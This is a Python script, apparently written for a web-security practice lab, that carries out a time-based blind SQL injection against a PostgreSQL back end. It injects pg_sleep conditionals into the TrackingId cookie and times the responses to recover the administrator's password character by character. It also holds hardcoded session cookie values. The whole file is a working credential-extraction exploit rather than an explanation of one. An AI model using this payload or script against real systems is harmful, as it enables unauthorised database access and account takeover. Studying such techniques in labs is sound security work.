import requests 
import time

caracteres='abcdefghijklmnopqrstuvwxyz0123987456' 

link = '{url}' 
headers = { 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
    "Referer": link 
}

cookie_tracking_id = 'Usuji7vMLDHpHQPI'
cookies = { 
    "TrackingId": cookie_tracking_id # + "'|| case when 1=1 then pg_sleep(3) else pg_sleep(0) end--"
    # "session": "VnLMaz1OxsIu2ejrmXojBRrMtE3FdHtJ" 
} 

response = requests.get(link, headers=headers, cookies=cookies) 
texto_html_bruto = response.text 
# print(texto_html_bruto)
print(response.status_code) 


senha = ''
count = 0
tempo_total_inicio = time.time()
while True:
    count += 1
    for char in caracteres: 
        print(f'--> "{char}"')
        cookies = { 
            # nesse caso, ta em postgreSQL
            "TrackingId": f"' || case when (substring((select password from users where username='administrator'),1,{count})='{senha}{char}') then pg_sleep(5) else pg_sleep(0) end--", 
            "session": "vqyRVfBiB9iJkuVYMBey4Q6ceHreLU72" 
        } 
        tempo_inicio_request = time.time()
        response = requests.get(link, headers=headers, cookies=cookies) 
        tempo_fim_request = time.time()
        tempo_total_request = tempo_fim_request - tempo_inicio_request

        if tempo_total_request > 4:
            print(f'#### {char} - {tempo_total_request}') 
            senha += char
            print(f'------------------')
            print(f'# - {senha}')
            print(f'------------------\n')
            break
    if len(senha) != count:
        break

    # print(resultados) 
print(f'>>> {senha}')
tempo_total_fim = time.time()
print(f'--= {tempo_total_fim-tempo_total_inicio} =--')